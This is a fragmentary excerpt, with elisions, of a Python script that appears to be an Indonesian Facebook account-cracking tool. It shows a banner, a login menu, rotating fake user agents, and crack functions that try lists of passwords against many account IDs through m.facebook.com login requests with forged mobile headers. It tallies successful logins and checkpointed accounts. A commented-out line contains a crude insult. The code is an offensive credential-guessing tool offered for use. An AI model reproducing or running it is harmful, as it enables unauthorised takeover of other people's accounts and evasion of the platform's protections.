...
for xd in range(10000):
	...
	f='Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 OPR/62.0.3143.57147'
	...
	uaku2= random.choice([zax6,zax3,zax7])
	ugen.append(uaku2)
for x in range(10):
...
╚╦╝╠═╣║║║ ║║║╣ ╔╩╦╝
 ╩ ╩ ╩╝╚╝═╩╝╚═╝╩ ╚═      {K}•Version : {H}Update
{p}[•• ────────────────────────────────────────── ••]{x}⠀⠀⠀⠀⠀
[•NAMA : {H}YANDEX |{P}•STATUS : {H}PRIVATE{P}••••••••••••©•]
{p}[•• ────────────────────────────────────────── ••]{x}⠀⠀⠀⠀⠀''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
#	cetak(nel('\tSelamat Datang [green]%s[white] Ngentod'%(my_name)))
	alvino_xy(f'⌲ USER NAME:'+str(my_name))
	alvino_xy(f'⌲ USER ID  :'+str(my_id))
	alvino_xy(f'⌲ DAY      :'+str(tgl)+'.'+str(bln)+'.'+str(thn))
...
#	print('>> 4. Mtouch ')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print()
	pwplus=input('⌲ Tambahkan password ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	print(f'⌲ Mainkan Modpes Setiap 500 ID\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {H}Mobile•{P}[{b}{loop}{P}/{u}{len(id)}{P}]•{P}[{H}{ok}{P}]•{P}[{k}{cp}{x}]•[{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
...
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r {H}Validate•{P}[{b}{loop}{P}/{u}{len(id)}{P}]•{P}[{H}{ok}{P}]•{P}[{k}{cp}{x}]•[{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
